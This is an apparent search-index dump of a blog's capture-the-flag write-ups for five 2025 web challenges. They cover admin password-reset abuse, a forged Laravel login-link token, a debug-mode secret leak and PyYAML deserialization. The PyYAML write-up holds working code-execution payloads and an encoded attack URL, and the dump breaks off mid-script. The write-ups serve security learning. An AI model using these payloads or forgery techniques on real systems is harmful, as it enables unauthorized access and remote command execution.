","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:1:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:2:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Provided Files Files:  Attached Files 🔍 Initial Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:2:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation Creating an account and logging into the site, it appears as follows: Home Page Trying to access the last image of the site, I receive the following error message: Ben 10 Consequently, I believe privileged access to the page is required. By examining the attached files, I noticed that every time a user was registered, another account was created in the database with admin privileges. The username of this account was formatted as “admin^username^token”. This can be observed in the following function in the app.py file: @app.route('/register', methods=['GET', 'POST']) def register(): \"\"\"Handle user registration.\"\"\" if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username.startswith('admin') or '^' in username: flash(\"I don't like admins\", \"error\") return render_template('register.html') if not username or not password: flash(\"Both fields are required.\", \"error\") return render_template('register.html') admin_username = f\"admin^{username}^{secrets.token_hex(5)}\" admin_password = secrets.token_hex(8) try: conn = sqlite3.connect(DATABASE) cursor = conn.cursor() cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (username, password, admin_username)) cursor.execute(\"INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)\", (admin_username, admin_password, None)) conn.commit() except sqlite3.IntegrityError: flash(\"Username already exists!\", \"error\") return render_template('register.html') finally: conn.close() flash(\"Registration successful!\", \"success\") return redirect(url_for('login')) return render_template('register.html') Now, all we need is to find the user and exploit the password reset function for the admin user to gain access and extract the flag. I noticed that the admin username is exposed on the homepage after logging in, inside an HTML tag with CSS display:none, making it visible through the page source using ChromeDevTools: \u003cdiv style=\"display:none;\" id=\"admin_data\"\u003e{{ admin_username }}\u003c/div\u003e In fact, by viewing the page source, we can retrieve the admin username: Admin Username now we can proceed to the exploit. 🎯 Solution Path ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:3:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation Steps ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:4:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Initial setup The initial phase involves registering a user account. Afterward, we need to log in and retrieve the username of the admin account that was created alongside the user account. This admin username is displayed on the homepage, as mentioned earlier. Once we have obtained the username, we can move on to the actual exploit. ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:4:1","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation The exploit involves resetting the password of the admin account to gain access. However, on the reset screen, we can only reset the password of the user account because a check is implemented in the reset function to block any user whose username starts with admin. Therefore, we begin the reset process with the normal user account created earlier to generate a valid reset token: Reset Token Once the token is generated, we gain access to the reset page. Here, no checks are applied on the type of account we want to reset; we only need to know the account name we obtained in the initial phase. Therefore, we proceed to reset the password of the admin account associated with our user account: Admin Password Reset Once the reset is completed, we simply need to log in with the admin account whose password we just reset, and visit the route /ben/10, which is the last photo in the list, to obtain the flag. ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:4:2","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:4:3","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Approach The exploit uses requests and BeautifulSoup for extracting the user, the token, and the flag. It literally performs the step-by-step actions described previously: first, it creates an account using the Faker library to generate fake credentials. Then, it logs in and extracts the admin username associated with the user created earlier. After that, it resets the password for the admin user. Finally, after logging in again and visiting the /ben/10 route, it extracts the flag using BeautifulSoup (bs4) and prints it.  Exploit 🚩 Flag Capture Flag ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:5:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit ChromeDevTools Web Testing 💡 Key Learnings Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📊 Final Statistics Metric Value Notes Time to Solve 00:10 From start to flag Global Ranking (At the time of flag submission) 20/1566 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 • Last Modified: 19-01-2025 Author: mH4ck3r0n3 • Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:6:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'KnightCal' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":" Challenge Presentation 📊 Challenge Overview Category Details Additional Info 🏆 Event KnightCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 150 Out of XXXX total ⭐ Difficulty 🟢 Easy Personal Rating: 1/10 👤 Author NomanProdhan Profile 🎮 Solves (At the time of flag submission) 269 XX% solve rate 📅 Date 20-01-2025 KnightCTF - 2025 Day X 🦾 Solved By mH4ck3r0n3 Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:0:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📝 Challenge Information In the realm of ancient codes, only those who enumerate correctly can unveil the hidden flag. Craft your mathematical expressions wisely and uncover the secrets that lie within. Flag Format: KCTF{FLaG_HeRe} ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:1:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:2:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Provided Files Files: None 🔍 Initial Analysis ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:2:1","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation by trying to enter something in the numeric input box and submitting, I get letters in the file name: Submit Try so, I assume it’s about finding the correct combination to print the contents of the file flag.txt. 🎯 Solution Path ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:3:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploitation Steps ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:4:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial setup After understanding how it works, I moved on to the exploit, doing a bit of guessing on the letters to figure out which number corresponded to which letter. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:4:1","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploitation After a couple of attempts, I came up with this: Second Attempt continuing to experiment, I found the correct combination, 7195, which allowed me to read the flag.txt file. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:4:2","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:4:3","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Approach The exploit is very simple: it’s a POST request to the page where I pass the parameter expression=7195, which is the correct combination. Then, I extract the flag from the response text using bs4:  Exploit 🚩 Flag Capture Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:5:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:6:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📊 Final Statistics Metric Value Notes Time to Solve 00:04 From start to flag Global Ranking (At the time of flag submission) 9/445 Challenge ranking Points Earned 150 Team contribution Created: 20-01-2025 • Last Modified: 20-01-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knightcal/:7:0","tags":["🌐 Web Security"],"title":"🌐 KnightCal","uri":"/posts/2025/02/04/knightcal/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Knight Connect' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":" Challenge Presentation 📊 Challenge Overview Category Details Additional Info 🏆 Event KnightCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 260 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author NomanProdhan Profile 🎮 Solves (At the time of flag submission) 49 XX% solve rate 📅 Date 20-01-2025 KnightCTF - 2025 Day X 🦾 Solved By Bebo07 Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:0:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"📝 Challenge Information In a realm where ancient knights and modern technology collide, a mysterious portal emerges—known as “Knight Connect.” Only the wisest and most cunning warriors can decipher its secrets. Legends whisper of a forgotten system, guarded by layers of encryption and vulnerabilities, waiting for a brave soul to breach its defenses. Do you possess the skills to uncover the truth? Enter the domain of Knight Connect and etch your name into the annals of digital knighthood. The challenge awaits. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:1:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:2:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Provided Files Files:  Attached Files 🔍 Initial Analysis ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:2:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"First Steps The site initially appeared as follows: Site Presentation with a login screen. After completing the registration and login, I was redirected to the following page: Home Page I couldn’t find anything else on the site, so I started reading the attached files. At first, I was overwhelmed and didn’t know where to look due to the number of files present. The first thing that came to mind was to forge some session cookies since the APP_KEY of Laravel was in the .env file. Also, because it required the session to be set to is_admin in order to display the flag. We can see this from the following lines of code in the index.blade.php file under the resources/views/users folder: @if (isset($flag) \u0026\u0026 session()-\u003ehas('is_admin') \u0026\u0026 session('is_admin')) \u003cdiv class=\"flag\"\u003eFlag: {{ $flag-\u003eflag }}\u003c/div\u003e @endif but then I discovered that it wasn’t the right path. However, I realized that I needed to get an administrator account to be able to read the flag. In the web.php file under the resources/routes folder, I found all the routes of the site, including one that seemed a bit suspicious: /contact. Visiting it redirected me to the following page: Contact where the administrator accounts and their respective emails were displayed. Spoiler: only one of these was valid, which was nomanprodhan@knightconnect.com (the username of the challenge creator). I then continued looking at other files, but I was interested in how authentication was being handled, so I searched for the authentication file, which was named AuthController.php under the Http/Controllers folder. Here I found the vulnerability—there were two functions that allowed you to request a login link for an account, which created a token formed by combining the email and a timestamp at that moment, all encrypted using the bcrypt function. The other function allowed you to log in using that generated link by passing the token as a parameter: public function requestLoginUrl(Request $request) { $request-\u003evalidate([ 'email' =\u003e 'required|email', ]); $user = User::where('email', $request-\u003eemail)-\u003efirst(); if (!$user) { return back()-\u003ewithErrors(['email' =\u003e 'Email not found']); } $time = time(); $data = $user-\u003eemail . '|' . $time; $token = bcrypt($data); $loginUrl = url('/login-link?token=' . urlencode($token) . '\u0026time=' . $time . '\u0026email=' . urlencode($user-\u003eemail)); return back()-\u003ewith('success', 'Login link generated, but email sending is disabled.'); } public function loginUsingLink(Request $request) { $token = $request-\u003equery('token'); $time = $request-\u003equery('time'); $email = $request-\u003equery('email'); if (!$token || !$time || !$email) { return response('Invalid token or missing parameters', 400); } if (time() - $time \u003e 3600) { return response('Token expired', 401); } $data = $email . '|' . $time; if (!Hash::check($data, $token)) { return response('Token validation failed', 401); } $user = User::where('email', $email)-\u003efirst(); if (!$user) { return response('User not found', 404); } session(['user_id' =\u003e $user-\u003eid]); session(['is_admin' =\u003e $user-\u003eis_admin]); return redirect()-\u003eroute('users'); } the first function doesn’t really have any vulnerabilities, since it only shows how the token is created to request the “instant” login URL. In contrast, the second function has a significant vulnerability, as the only check it does is ensure the timestamp of the generated token is at most one hour old (3600 seconds), otherwise, it becomes invalid. However, we can manipulate the timestamp ourselves by passing a fake value as a parameter. In fact, to make it secure, the generated token with the timestamp should have been saved in the database, and if it wasn’t the exact timestamp, it wouldn’t allow access (although a brute-force attack could be used to try all possible timestamps). So, I realized that it’s possible to forge a token—one just needs to know the email of the account they want to access, and as we saw earlier in the /contact route, there were quite a few admin emails… Now that we’ve figured it all out, let’s proceed with the exploit. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:3:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:4:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Potential Vulnerabilities Insecure Authentication 🎯 Solution Path ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:4:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploitation Steps ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:5:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial setup Initially, to generate the URL, I used https://onlinephp.io/. I also found this website useful for generating “passwords” with Laravel’s bcrypt (https://fbutube.com/laravel-password-generator). However, in the end, I decided to write it in PHP and run it locally, as this way I could fully automate the process. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:5:1","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploitation After obtaining the admin’s email nomanprodhan@knightconnect.com, it was quite simple to forge a token, since it was made up of “email|timestamp”. I then wrote a PHP script that did exactly what the first function did, using bcrypt on the string formed by the admin’s email + timestamp, and then generating a link similar to the one in the function with the parameters token, time, and email. This way, I created a valid login link, since the user associated with the email actually existed. I gained access to their account, and by visiting the homepage as seen earlier, with the is_admin flag on the account, I was able to retrieve the flag. ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:5:2","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:5:3","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Approach I wrote the exploit in PHP because I had issues with token composition using bcrypt in Python. This exploit takes the admin’s email, which has the flag in their profile, and then creates a valid token with a timestamp less than one hour old. It then generates a URL with a valid token to access the admin profile, and through a cURL function in PHP, it makes a request to the page, extracting the flag via a regex. I used the following commands for the requirements and the run: sudo apt install php sudo apt-get install php-curl php exploit.php  Exploit 🚩 Flag Capture Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:6:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:7:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Primary Tools Tool Purpose PHP Exploit 💡 Key Learnings ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:8:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:9:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Learning Resources https://laravel.com/docs/11.x/hashing 📊 Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking (At the time of flag submission) 10/451 Challenge ranking Points Earned 260 Team contribution Created: 20-01-2025 • Last Modified: 20-01-2025 Author: mH4ck3r0n3 • Team: QnQSec ","date":"04/02/2025","objectID":"/posts/2025/02/04/knight-connect/:10:0","tags":["🔐 Insecure Authentication","💻 Laravel","🌐 Web Security"],"title":"🌐 Knight Connect","uri":"/posts/2025/02/04/knight-connect/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Exceeding Knight' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/","tags":["🛑 Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"🌐 Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Challenge Description Challenge Presentation ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:1","tags":["🛑 Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"🌐 Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appeared as follows: Site Presentation There was nothing interesting here, so I began reading the attached files. The first thing I did was read the web.php file located in the routes folder. I found the following routes: Route::get('/calculator', [CalculatorController::class, 'index']); Route::post('/calculator', [CalculatorController::class, 'calculate']); // Handle form submission Route::get('/convert', [UnitConversionController::class, 'index']); Route::post('/convert', [UnitConversionController::class, 'convert']); Route::get('/character-count', [StringManipulationController::class, 'characterCountIndex']); Route::post('/character-count', [StringManipulationController::class, 'characterCount']); Route::get('/reverse-string', [StringManipulationController::class, 'reverseStringIndex']); Route::post('/reverse-string', [StringManipulationController::class, 'reverseString']); Route::post('/profile', [ProfileController::class, 'index']); Route::get('/profile/error', [ProfileController::class, 'triggerError']); // Error-triggering route Route::get('/', function () { return view('welcome'); Next, I read the .env file and found something interesting: APP_NAME=Laravel APP_ENV=local APP_KEY=base64:KnrD53eO60BJBvCVGNlBuOqktUCAsTuod34OelLJjPQ= APP_DEBUG=true APP_URL=http://localhost MAX_CALC_LIMIT=100000000000000000 LOG_CHANNEL=stack LOG_DEPRECATIONS_CHANNEL=null LOG_LEVEL=debug DB_CONNECTION=mysql DB_HOST=127.0.0.1 DB_PORT=3306 DB_DATABASE=laravel DB_USERNAME=root DB_PASSWORD= BROADCAST_DRIVER=log CACHE_DRIVER=file FILESYSTEM_DISK=local QUEUE_CONNECTION=sync SESSION_DRIVER=file SESSION_LIFETIME=120 FLAG=KCTF{i_am_not_flag} Aside from the APP_KEY and FLAG, as we can see, Laravel’s debug mode is enabled. When debug mode is enabled in Laravel, any error that occurs will trigger a detailed error page. This page includes: Error Message: A clear description of the error. Stack Trace: A full trace of the error, showing the file paths and lines of code where the issue occurred. Environment Details: Information about the environment, including variables, configurations, and request headers. Sensitive Data Exposure: Potential exposure of .env values, database credentials, API keys, and other sensitive information. So, I thought about exploiting the enabled debug mode in Laravel to capture the flag. The only thing I needed was a way to trigger any kind of error. I found this method in the /calculator route, to be more precise, in the CalculatorController.php file under the Http/Controllers folder. As we can see, by entering a number greater than MAX_CALC_LIMIT=100000000000000000 an exception is thrown: \u003c?php namespace App\\Http\\Controllers; use Illuminate\\Http\\Request; class CalculatorController extends Controller { public function index() { return view('calculator'); } public function calculate(Request $request) { $request-\u003evalidate([ 'num1' =\u003e 'required|numeric', 'num2' =\u003e 'required|numeric', 'operation' =\u003e 'required|in:add,sub,mul,div', ]); $num1 = $request-\u003einput('num1'); $num2 = $request-\u003einput('num2'); $operation = $request-\u003einput('operation'); $limit = env('MAX_CALC_LIMIT', 100000); if ($num1 \u003e $limit || $num2 \u003e $limit) { throw new \\Exception(\"You have hit the calculation limit set in the .env file.\"); } $result = match ($operation) { 'add' =\u003e $num1 + $num2, 'sub' =\u003e $num1 - $num2, 'mul' =\u003e $num1 * $num2, 'div' =\u003e $num2 != 0 ? $num1 / $num2 : throw new \\Exception(\"Division by zero is not allowed.\"), }; return view('calculator', ['result' =\u003e $result]); } } ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:2","tags":["🛑 Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"🌐 Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit So, all I had to do was enter 1000000000000000000 (just adding a simple zero) in the num1 parameter to trigger the exception. This caused the detailed error page to return, which contained the flag inside it: Manual Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:3","tags":["🛑 Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"🌐 Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Flag Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/exceeding-knight/:0:4","tags":["🛑 Improper Error Handling","💻 Laravel","🌐 Web Security"],"title":"🌐 Exceeding Knight","uri":"/posts/2025/02/04/exceeding-knight/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Baby Injection' from KnightCTF - 2025","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/","tags":["‼️ YAML Insecure Deserialization","‼️ Insecure Deserialization","🌐 Web Security"],"title":"🌐 Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Challenge Description Challenge Presentation ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:1","tags":["‼️ YAML Insecure Deserialization","‼️ Insecure Deserialization","🌐 Web Security"],"title":"🌐 Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Initial Analysis The site appears as follows: Site Presentation The first thing that immediately stands out is the site’s URL: http://172.105.121.246:5990/eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE= In fact, that looks like a base64 encoding. Let’s try to decode it: echo \"eWFtbDogSXRzIHlhbWwgYnJvLCBoYWNrIG1lIGlmIHlvdSBjYW4hISE=\" | base64 -d Decoding it, I got the following: yaml: Its yaml bro, hack me if you can!!! So, the decoded base64 seems to be reflected on the page, as we can see from the previous screenshot. It seems that since it mentions YAML, this could be a case of YAML insecure deserialization. In fact, looking at the request header, we can tell that everything is being executed with Python. Since Python has a library called PyYAML, we can exploit the deserialization process to achieve Remote Code Execution (RCE). ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:2","tags":["‼️ YAML Insecure Deserialization","‼️ Insecure Deserialization","🌐 Web Security"],"title":"🌐 Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Exploit I personally used this payload: yaml: !!python/object/apply:eval [\"__import__('os').listdir('.')\"] But many other payloads could have been used, such as: yaml: !!python/object/apply:subprocess.getoutput [\"ls -al\"] Other payloads can be found on PayloadsAllTheThings. So, I simply encoded it in base64: echo \"yaml: python/object/apply:subprocess.getoutput ['ls -al']\" | base64 And that’s how I formed the URL for injecting the “ls -al” command: http://172.105.121.246:5990/eWFtbDogcHl0aG9uL29iamVjdC9hcHBseTpzdWJwcm9jZXNzLmdldG91dHB1dCBbJ2xzIC1hbCdd By opening the URL, the command was executed on the server, listing the directories, and in doing so, I found the flag: Manual Flag ","date":"04/02/2025","objectID":"/posts/2025/02/04/baby-injection/:0:3","tags":["‼️ YAML Insecure Deserialization","‼️ Insecure Deserialization","🌐 Web Security"],"title":"🌐 Baby Injection","uri":"/posts/2025/02/04/baby-injection/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/KnightCTF-2025/Web"],"content":"Automated Exploit I also created an automated Python exploit for extracting the flag: import requests import base64 import re url = 